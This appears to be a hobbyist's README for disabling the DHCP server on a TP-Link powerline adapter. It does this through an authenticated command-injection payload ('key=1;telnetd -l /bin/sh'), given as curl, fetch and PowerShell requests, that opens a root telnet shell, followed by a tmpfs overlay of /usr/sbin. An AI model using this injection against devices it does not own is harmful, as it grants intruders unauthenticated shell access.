# Disable DHCP
This disables the DHCP server, which breaks internet on networks with a primary DHCP server. See [this forum post on the TP-Link forums](https://community.tp-link.com/us/home/forum/topic/106148) for user complaints. TP-Link never updated the firmware on this model to add on option to disable the server.

# Usage
1. Log into pofwerline web interface/management page
2. Note the url/ip address to the powerline and authorization cookie
3. Send an authenticated HTTP POST request to `http://${powerline_url}/powerline?form=plc_device` with the following data. Alternatively, sent the request from your browser. Use either CURL, setting the shell script variables `powerline_url` and `authorization_cookie` to appropriate values:
```bash
curl 'http://${powerline_url}/admin/powerline?form=plc_device' -X POST -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: ${powerline_url}/' -H 'Origin: ${powerline_url}' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: Authorization=${authorization_cookie}' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'operation=remove&key=1;telnetd -l /bin/sh'
```
or this JavaScript fetch code:
```javascript
await fetch("http://192.168.0.254/admin/powerline?form=plc_device", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    },
    "referrer": "http://192.168.0.254/",
    "body": "operation=remove&key=1;telnetd -l /bin/sh",
    "method": "POST",
    "mode": "cors"
});
```
or PowerShell code (not really tested):
```powershell
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.Cookies.Add((New-Object System.Net.Cookie("Authorization", $authorizationCookie, "/", $powerlineUrl)))
Invoke-WebRequest -UseBasicParsing -Uri "http://$powerlineUrl/admin/powerline?form=plc_device" `
-Method POST `
-WebSession $session `
-Headers @{
"Accept" = "application/json, text/javascript, */*; q=0.01"
  "Accept-Language" = "en-US,en;q=0.5"
  "Accept-Encoding" = "gzip, deflate"
  "Referer" = "http://$powerlineUrl/"
  "Origin" = "http://$powerlineUrl"
  "DNT" = "1"
  "X-Requested-With" = "XMLHttpRequest"
  "Pragma" = "no-cache"
  "Cache-Control" = "no-cache"
} `
-ContentType "application/x-www-form-urlencoded; charset=UTF-8" `
-Body "operation=remove&key=1;telnetd -l /bin/sh"
```

This exploits a command injection vulnerability in the http server code on the powerline to start a telnet server.

4. Run `payload.sh` on the powerline via telnet by running on your local machine `upload-payload.sh`

Read the output and make there aren't any errors.

If you don't see any output, try increasing the sleep time higher than 15.
If the payload was interrupted or already run before, you may need to undo its partially changes before rerunning the script. I should document how to do that.

(see https://unix.stackexchange.com/a/296161) for source of this command.

5. To verify if command worked, telnet into the powerline and print the contents of `/usr/sbin/udhcpd`:
```bash
cat /usr/sbin/udhcpd
```
Verify that it is just a shell script that just creates the `/tmp/udhcpd.pid` file or something similar.

6. Kill the telnet server since that is a big vulernability
```bash
killall telnetd
```

And that's it. The DHCP server on the powerline should never start up. This process will need to be repeated each time the powerline is rebooted or loses power since this modifies only RAM and not the persistent firmware. A modified firmware could be created that disables the DHCP server permanently, but I'm scared of bricking my device, so I chose this route instead.

This device doesn't appear to have any recovery mechanisms via TFTP like some routers.

# Technical Details
The daemon LanSettingsd starts `/usr/sbin/udhcpd`, which is from `busybox`, under certain conditions.
From reverse engineering via Ghidra, one condition triggering it is when LAN settings (IP address, subnet mask, etc.) are written to (changed) from the web, but I'm not very confident about that.

This solution overwrites the `udhcpd` executable with a shell script that returns immediately instead. The shell script also creates a `/tmp/udhcpd.pid` file because LanSettingsd appears to use that file to decide whether to try starting `udhcpd` again. There shouldn't be any impact of it starting `udhcpd` mulitple times, but it seems inefficient.

The root filesystem is a squashfs which is read-only. To allow modifications, therefore, we bind mount a tmpfs (`/tmp/hacked_sbin`) over `/usr/sbin` and put a modfied copy of the original `/usr/sbin` into the tmpfs.

I could also paste the entire command into the command injection rather than use telnet. I'm not sure if there's a character limit. In `httpd`, `execFormatCmd` appears to have a 2048 byte buffer, which might be a limit. 